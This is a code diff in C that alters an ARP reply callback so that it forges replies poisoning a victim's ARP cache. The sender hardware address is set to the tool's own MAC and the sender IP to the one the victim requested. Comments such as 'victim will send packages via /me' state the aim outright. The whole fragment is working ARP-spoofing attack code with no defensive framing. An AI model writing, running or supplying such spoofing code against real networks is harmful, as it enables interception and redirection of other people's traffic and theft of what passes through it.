@@ -108,19 +108,22 @@ int spf_arp_callback(unsigned char* _packet, int _len, void* _args)
 		//
 		ARP_PACKET* reply = (ARP_PACKET*)calloc( 1, sizeof(ARP_PACKET) );
 
+		// send to asking machine
+		//
 		// packet headers
 		memcpy( reply->eth_hdr.ether_dhost, &eshw, sizeof(eshw) );
-		memcpy( reply->eth_hdr.ether_shost, &edhw, sizeof(edhw) );
+		memcpy( reply->eth_hdr.ether_shost, &(prop->own_hw), sizeof(prop->own_hw) );
 		reply->eth_hdr.ether_type = pack->eth_hdr.ether_type;
 
 		memcpy( &(reply->arp_hdr), &(pack->arp_hdr), sizeof(pack->arp_hdr) );
 		reply->arp_hdr.ar_op = htons( ARPOP_REPLY );
 
 		// packet data
-		memcpy( reply->arp_data.shw, &(prop->own_hw), sizeof( ashw ) );
-		memcpy( reply->arp_data.sip, &(atip), sizeof( asip ) );
-		memcpy( reply->arp_data.thw, &(ashw), sizeof( athw ) );
-		memcpy( reply->arp_data.tip, &(asip), sizeof( atip ) );
+		memcpy( reply->arp_data.shw, &(prop->own_hw), sizeof( ashw ) );		// victim will send packages via /me
+		memcpy( reply->arp_data.sip, &(atip), sizeof( asip ) );				// tell victim /me have desirable IP
+		memset( reply->arp_data.thw, 0, sizeof( athw ) );					// don't care
+		memset( reply->arp_data.tip, 0, sizeof( atip ) );					// don't care
+
 
 		// address data
 		struct sockaddr_ll sall;
@@ -130,7 +133,7 @@ int spf_arp_callback(unsigned char* _packet, int _len, void* _args)
 		sall.sll_hatype = ARPHRD_ETHER;
 		sall.sll_pkttype = PACKET_OTHERHOST;	// destinaton is another host
 		sall.sll_halen = ETH_ALEN;
-		memcpy( sall.sll_addr, pack->eth_hdr.ether_dhost, sizeof(pack->eth_hdr.ether_dhost) );	// dst ETH
+		memcpy( sall.sll_addr, &(eshw), sizeof(eshw) );	// dst ETH
 		sall.sll_addr[6] = 0x00;
 		sall.sll_addr[7] = 0x00;
 
